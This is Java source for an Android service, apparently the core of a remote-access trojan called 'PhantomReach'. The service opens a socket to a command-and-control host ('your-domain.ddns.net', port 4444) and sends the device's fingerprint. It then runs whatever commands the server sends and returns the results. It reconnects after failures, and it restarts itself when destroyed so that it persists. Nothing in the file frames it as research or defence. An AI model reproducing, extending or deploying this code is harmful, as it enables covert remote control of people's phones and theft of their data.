package com.phantom.reach;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;

public class MainService extends Service {
    private static final String C2_HOST = "your-domain.ddns.net";
    private static final int C2_PORT = 4444;
    private Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private boolean running = true;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::connectAndLoop).start();
        return START_STICKY;
    }

    private void connectAndLoop() {
        while (running) {
            try {
                socket = new Socket(C2_HOST, C2_PORT);
                in = new DataInputStream(socket.getInputStream());
                out = new DataOutputStream(socket.getOutputStream());
                
                // Send device fingerprint
                out.writeUTF(DeviceInfo.getFullInfo(this));
                out.flush();
                
                while (socket.isConnected() && running) {
                    String cmd = in.readUTF();
                    String result = CommandExecutor.execute(this, cmd);
                    out.writeUTF(result);
                    out.flush();
                }
            } catch (Exception e) {
                Log.e("PhantomReach", "C2 disconnected, reconnecting...");
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    @Override
    public void onDestroy() {
        running = false;
        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
        super.onDestroy();
        // Restart service if killed
        Intent restart = new Intent(this, MainService.class);
        startService(restart);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}